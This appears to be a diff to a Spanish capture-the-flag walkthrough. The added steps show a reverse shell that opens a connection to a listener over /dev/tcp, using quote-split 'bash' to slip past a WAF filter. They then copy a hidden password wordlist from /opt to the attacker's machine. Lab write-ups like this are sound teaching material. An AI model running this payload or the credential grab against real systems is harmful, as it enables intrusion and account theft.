@@ -46,4 +46,17 @@ Esto funciona de la siguiente manera:
 Si nos saltamos una de las dos condiciones, el WAF no lo validará.
 
 ## Paso N4: Ejecutando una reverse shell
-Una vez entendido los filtros de WAF, podemos ejecutar una reverse shell escuchando en nuestra terminal un puerto con ```nc -lvnp 443```
+Una vez entendido los filtros de WAF, podemos ejecutar una reverse shell escuchando en nuestra terminal con ```nc -lvnp 443``` y ejecutando en la terminal de la página
+```
+/var/log | bas''h -c 'bas''h -i >& /dev/tcp/172.17.0.1/443 0>&1'
+```
+tendremos acceso a la shell de la página.
+![]()
+
+## Paso N5: Cambiando de usuario
+En el directorio ```/opt``` hay un archivo oculto llamado ```.vault_pass.txt``` y dentro tiene lo que parecer ser una wordlist
+![]()
+
+nos copiaremos las contraseñas de la wordlist a nuestra máquina local y las guardaré en un archivo llamado ```vaultpasswd```
+
+
